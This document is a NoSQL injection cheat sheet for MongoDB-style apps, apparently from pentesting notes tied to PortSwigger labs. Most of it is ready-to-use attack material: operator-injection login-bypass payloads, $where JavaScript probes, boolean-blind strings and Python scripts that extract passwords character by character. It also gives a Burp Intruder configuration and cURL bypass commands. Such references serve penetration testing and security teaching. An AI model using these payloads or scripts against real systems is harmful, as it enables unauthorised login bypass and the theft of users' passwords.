# NoSQL Injection — Quick Start

Quick reference. Per-technique scenarios in `scenarios/nosql/`. See `injection-principles.md` for decision tree.

## Quick detection

```bash
# Syntax injection probes
?category=Gifts'           # Single quote → 500 = vuln
?category=Gifts"           # Double quote
?category=Gifts'||1||'     # Boolean tautology

# Operator injection probes (JSON body)
{"username":"admin","password":{"$ne":""}}
{"username":{"$ne":""},"password":{"$ne":""}}

# URL-encoded form
username[$ne]=&password[$ne]=
```

## Top auth-bypass payloads

```json
{"username":"admin","password":{"$ne":""}}
{"username":{"$ne":""},"password":{"$ne":""}}
{"username":{"$regex":"^admin"},"password":{"$ne":""}}
{"username":{"$gt":""},"password":{"$gt":""}}
{"username":{"$in":["admin","root"]},"password":{"$ne":""}}
```

## URL-encoded equivalent

```
username[$ne]=&password[$ne]=
username[$gt]=&password[$gt]=
username[$regex]=^admin&password[$ne]=
```

## $where JavaScript injection

```javascript
{"$where": "1"}                                    # detection
{"$where": "this.password.length == 8"}            # length probe
{"$where": "this.password[0]=='a'"}                # char probe
{"$where": "this.password.match('^a')"}            # regex probe
{"$where": "Object.keys(this).length"}             # field count
```

## Boolean blind via injection in string context

```javascript
admin' && this.password.length == 8 || 'a'=='b
admin' && this.password[0]=='a' || 'a'=='b
admin' && /^a/.test(this.password) || 'a'=='b
admin' && this.password.charCodeAt(0)==97 || 'a'=='b
```

Trailing `|| 'a'=='b` mandatory — closes the syntax cleanly.

## Common operators

| Operator | Use |
|---|---|
| `$ne` | Not equal |
| `$gt` / `$gte` | Greater than |
| `$lt` / `$lte` | Less than |
| `$in` / `$nin` | In / not in array |
| `$regex` | Pattern match |
| `$exists` | Field exists |
| `$where` | JS predicate |
| `$or` / `$and` / `$not` / `$nor` | Logical |

## Decision tree

```
JSON body accepted?
├── Yes → operator injection (scenarios/nosql/mongo-operator-injection.md)
└── No → URL-encoded? → bracket notation (mongo-type-confusion.md)

String concat into query?
└── scenarios/nosql/mongo-syntax-injection.md

$where reachable?
└── scenarios/nosql/mongo-where-jsinjection.md

Aggregation pipeline endpoint?
└── scenarios/nosql/mongo-aggregation-pipeline.md

SSRF + gopher://?
└── scenarios/nosql/redis-ssrf-gopher.md

Cassandra on 9042?
└── scenarios/nosql/cassandra-cql.md
```

## Character extraction (Python)

```python
import requests, string
def extract_password(url, username, length):
    pw = ""
    chars = string.ascii_lowercase + string.digits
    for pos in range(length):
        for c in chars:
            payload = f"{username}' && this.password[{pos}]=='{c}' || 'x'=='y"
            r = requests.get(url, params={'user': payload})
            if "Your username is:" in r.text:
                pw += c
                break
    return pw
```

## Binary search (charCodeAt)

```python
def binary_search_char(url, position):
    low, high = 32, 126
    while low <= high:
        mid = (low + high) // 2
        payload = f"admin' && this.password.charCodeAt({position})>{mid} || 'x'=='y"
        if "Your username is:" in requests.get(url, params={'user': payload}).text:
            low = mid + 1
        else:
            high = mid - 1
    return chr(low)
```

## Burp Intruder configuration

- Cluster Bomb (position × character).
- Position 1: numbers 0–32.
- Position 2: `abcdefghijklmnopqrstuvwxyz0123456789`.
- Grep Match: `Your username is:` / `Welcome back`.
- Request: `{"username":"admin","password":"x","$where":"this.password[§0§]=='§a§'"}`

## URL encoding

| Char | Encoded |
|---|---|
| `'` | `%27` |
| `"` | `%22` |
| `&` | `%26` |
| `\|` | `%7c` |
| `[` `]` | `%5b` `%5d` |
| `{` `}` | `%7b` `%7d` |
| `$` | `%24` |

## cURL examples

```bash
# JSON body operator
curl -X POST /login -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":{"$ne":""}}'

# URL-encoded form
curl -X POST /login -d 'username[$ne]=&password[$ne]='

# $where JS
curl -X POST /login -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"x","$where":"1"}'
```

## Tools

- NoSQLMap (`nosqlmap -u <url> --tor`).
- Burp Suite Intruder for char-by-char.
- Custom Python with `requests.post(json=...)`.
- mongosh / mongo CLI for sandbox testing.

## Resources

- `INDEX.md`, `injection-principles.md`.
- `scenarios/nosql/` — full scenarios.
- `nosql-injection-resources.md` — links, CVEs, tools.
- PortSwigger NoSQL labs.
